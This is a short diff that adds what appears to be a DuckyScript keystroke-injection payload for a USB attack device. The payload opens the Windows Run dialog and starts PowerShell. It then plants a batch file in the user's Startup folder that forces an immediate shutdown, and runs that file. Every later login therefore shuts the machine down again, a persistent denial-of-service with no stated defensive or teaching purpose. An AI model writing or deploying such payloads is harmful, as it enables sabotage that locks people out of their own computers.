@@ -1,0 +1,10 @@
+DELAY 500
+GUI r
+DELAY 625
+STRING powershell
+DELAY 500
+ENTER
+DELAY 750
+STRING $batFilePath="$env:AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\shutdown.bat"; $batFileContent="echo off`nshutdown /s /f /t 0"; Set-Content -Path $batFilePath -Value $batFileContent; Start-Process -FilePath $batFilePath
+DELAY 500
+ENTER
